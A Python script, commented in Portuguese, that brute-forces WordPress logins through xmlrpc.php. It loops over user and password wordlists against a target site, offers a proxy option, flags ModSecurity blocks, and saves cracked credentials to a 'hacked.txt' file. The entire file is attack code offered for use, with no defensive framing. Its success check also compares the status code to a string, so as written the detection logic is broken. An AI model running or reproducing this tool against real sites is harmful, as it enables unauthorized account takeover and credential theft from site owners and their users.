# BRUTEFORCE EM MAIS DE UM USUARIO VIA XMLRPC !

import requests as xml
import os
import colorama
import time
import datetime

sistema = os.name

if sistema == "nt":
	os.system('cls')
else:
	os.system('clear')

print(colorama.Fore.YELLOW)
escolha = str(input('Deseja usar proxy?[1=SIM|2=NAO]: ').strip())
while escolha != '1' and escolha != '2':
	escolha = str(input('[X] Digite uma opção válida: ').strip())
if (escolha == '1'):
		if(sistema == "nt"):
			os.system("proxies\wpx\proxies.py")
		else:
			os.system("python3 proxies/wpx/proxies.py")
else:
	 alvo = str(input("Digite seu alvo >> ").strip())
	 arquivo_usuarios = str(input("Informe o endereço do arquivo txt que contém os usuarios: ").strip())
	 arquivo_senhas = str(input("Informe o endereço do arquivo txt que contém as senhas: ").strip())
	 arquivousuarios = os.path.isfile(arquivo_usuarios)
	 arquivosenhas = os.path.isfile(arquivo_senhas)
	 while(arquivousuarios == 0):
	 	arquivo_usuarios = str(input("[X] Informe o endereço CORRETO do arquivo txt que contém os usuarios: ").strip())
	 	arquivousuarios = os.path.isfile(arquivo_usuarios)
	 while(arquivosenhas == 0):
	 	arquivo_senhas = str(input("[X] Informe o endereço CORRETO do arquivo txt que contém as senhas: ").strip())
	 	arquivosenhas = os.path.isfile(arquivo_senhas)
	 usuarios = open(arquivo_usuarios,'r')
	 usuarios_lista = usuarios.read().split('\n')
	 senhas = open(arquivo_senhas,'r')
	 senhas_lista = senhas.read().split('\n')
	 print(">> Iniciando ataque de força bruta em todos usuarios da lista em {} !\n".format(alvo))
	 cortempo = (colorama.Fore.CYAN)
	 cortentativa = (colorama.Fore.RED)
	 for senha in senhas_lista:
	 	for usuario in usuarios_lista:
	 	 site = ("{}/xmlrpc.php".format(alvo))
	 	 postdata = ("<?xml version='1.0'?><methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>{}</value></param><param><value>{}</value></param></params></methodCall>".format(usuario,senha))
	 	 r = xml.post(url=site,data=postdata)
	 	 conteudo = str(r.content)
	 	 tempoatual = (datetime.datetime.now().time())
	 	 tempo = str(tempoatual)
	 	 tempo = (tempo[0:8])
	 	 if('blogid' in conteudo and r.status_code == "200"):
	 	 	print("{}[{}]{} - {}:{} - SUCESSO!".format(cortempo,tempo,cortentativa,usuario,senha))
	 	 	f = open("hacked.txt","a")
	 	 	f.write("HACKED >>> {}:{} ===> {}".format(usuario,senha,alvo))
	 	 	f.close()
	 	 	continuar = str(input("Deseja continuar o bruteforce em outros usuários?[1=SIM|2=NAO]: "))
	 	 	if(continuar == "1"):
	 	 		print("Removendo '{}' da lista e testando novos usuários...".format(usuario))
	 	 		usuarios_lista.remove('{}'.format(usuario))
	 	 		time.sleep(3)
	 	 		print("Usuário {} removido !".format(usuario))
	 	 	elif(continuar == "2"):
	 	 		print("Bye, =)")
	 	 		exit()
	 	 elif('403' in conteudo):
	 	 	print("{}[{}]{} - {}:{} - Failed :(".format(cortempo,tempo,cortentativa,usuario,senha))
	 	 elif('406' in conteudo):
	 	 	print("{}[{}]{} - [WAF] Mod Security :(.".format(cortempo,tempo,cortentativa))
	 	 elif('<int>405</int>' in conteudo and r.status_code == 200) :
	 	 	print("{}[{}]{} - XmlRpc Desativado :/.".format(cortempo,tempo,cortentativa,(r.status_code)))
	 	 	exit()

